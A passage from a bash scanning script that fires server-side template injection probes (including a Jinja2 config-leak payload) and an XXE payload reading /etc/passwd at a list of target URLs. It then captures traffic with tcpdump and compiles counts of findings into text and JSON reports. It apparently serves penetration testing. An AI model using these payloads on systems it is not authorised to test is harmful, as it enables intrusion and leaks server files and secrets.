cat dirs_filtered_1.txt | grep "?" | while read url; do for ssti in "{{7*7}}" "${7*7}" "<%= 7*7 %>" "${{7*7}}" "{{config.items()}}"; do curl -s "$url$ssti" | grep -E "49|dict" && echo "SSTI: $url$ssti" >> vulns_critical_ssti_1.txt; done; done
# Purpose: Adds Flask/Jinja2 config leak payload.

# XML External Entity (XXE) testing
cat dirs_filtered_1.txt | grep "?" | while read url; do curl -s -X POST "$url" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | grep "root:" && echo "XXE: $url" >> vulns_critical_xxe_1.txt; done
# Purpose: Tests for XXE vulnerabilities.

# -----------------------------------
# Network Forensics
# -----------------------------------

# TCP dump for 120 seconds (requires sudo)
timeout 120 tcpdump -i any host $IP -w forensics_tcpdump_1.pcap -c 10000 2>/dev/null
# Purpose: Captures 120s or 10,000 packets.

# ARP table lookup
arp -an | grep $IP > forensics_arp_1.txt
# Purpose: Extracts ARP entries.

# Netstat for connections (if local)
netstat -tuln | grep $IP > forensics_netstat_1.txt
# Purpose: Lists open connections.

# DNS traffic capture (requires sudo)
timeout 60 tcpdump -i any port 53 and host $IP -w forensics_dns_1.pcap 2>/dev/null
# Purpose: Captures DNS traffic for 60s.

# -----------------------------------
# Final Reporting
# -----------------------------------

# Log counts to output
echo "Subdomains: $(wc -l < subdomains_verified_1_of_1.txt)" >> $output && echo "Ports: $(wc -l < ports_all_1_of_1.txt)" >> $output && echo "Critical Vulns: $(cat vulns_critical_1_of_1.txt | grep -i "vulnerability" | wc -l)" >> $output && echo "Medium Vulns: $(cat vulns_medium_1_of_1.txt | grep -i "vulnerability" | wc -l)" >> $output && echo "Low Vulns: $(cat vulns_low_1_of_1.txt | grep -i "vulnerability" | wc -l)" >> $output && echo "Sensitive Files: $(wc -l < dirs_sensitive_deep_1_of_1.txt)" >> $output
# Purpose: Summarizes key findings.

# Generate JSON summary
jq -n --arg subdomains "$(wc -l < subdomains_verified_1_of_1.txt)" --arg ports "$(wc -l < ports_all_1_of_1.txt)" --arg critical "$(cat vulns_critical_1_of_1.txt | grep -i "vulnerability" | wc -l)" --arg medium "$(cat vulns_medium_1_of_1.txt | grep -i "vulnerability" | wc -l)" --arg low "$(cat vulns_low_1_of_1.txt | grep -i "vulnerability" | wc -l)" --arg sensitive "$(wc -l < dirs_sensitive_deep_1_of_1.txt)" '{subdomains: $subdomains, ports: $ports, vulnerabilities: {critical: $critical, medium: $medium, low: $low}, sensitive_files: $sensitive}' > summary_1.json
# Purpose: Creates detailed JSON summary.

# Archive results
tar -czf scan_results_1.tar.gz *.txt *.json *.pcap
# Purpose: Compresses all results.

# Log completion
echo "Scan Completed: $(date +"%Y%m%d_%H%M%S")" >> $output
# Purpose: Logs end time.